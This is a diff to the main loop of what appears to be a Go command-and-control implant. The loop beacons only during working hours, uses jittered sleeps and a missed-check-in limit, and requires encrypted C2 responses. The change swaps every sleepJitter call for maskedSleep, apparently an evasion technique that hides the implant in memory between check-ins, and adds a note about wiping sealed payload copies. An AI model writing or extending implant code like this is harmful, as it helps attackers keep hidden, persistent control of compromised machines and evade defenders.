@@ -113,7 +113,7 @@ func main() {
 			return
 		}
 		if !inWorkingHours(workStart, workEnd) {
-			sleepJitter(sleep, jitter)
+			maskedSleep(sleep, jitter)
 			continue
 		}
 
@@ -140,7 +140,7 @@ func main() {
 			if maxMiss > 0 && miss >= maxMiss {
 				return
 			}
-			sleepJitter(sleep, jitter)
+			maskedSleep(sleep, jitter)
 			continue
 		}
 		raw, _ := json.Marshal(body)
@@ -150,7 +150,7 @@ func main() {
 			if maxMiss > 0 && miss >= maxMiss {
 				return
 			}
-			sleepJitter(sleep, jitter)
+			maskedSleep(sleep, jitter)
 			continue
 		}
 		b, _ := io.ReadAll(resp.Body)
@@ -160,14 +160,14 @@ func main() {
 			if maxMiss > 0 && miss >= maxMiss {
 				return
 			}
-			sleepJitter(sleep, jitter)
+			maskedSleep(sleep, jitter)
 			continue
 		}
 		miss = 0
 
 		var env map[string]any
 		if json.Unmarshal(b, &env) != nil {
-			sleepJitter(sleep, jitter)
+			maskedSleep(sleep, jitter)
 			continue
 		}
 		// AEAD required — refuse plaintext C2 responses
@@ -177,7 +177,7 @@ func main() {
 			if maxMiss > 0 && miss >= maxMiss {
 				return
 			}
-			sleepJitter(sleep, jitter)
+			maskedSleep(sleep, jitter)
 			continue
 		}
 		if s, ok := plain["session_id"]; ok {
@@ -212,6 +212,7 @@ func main() {
 				}
 			}
 		}
-		sleepJitter(sleep, jitter)
+		// wipe sealed payload copies when present
+		maskedSleep(sleep, jitter)
 	}
 }
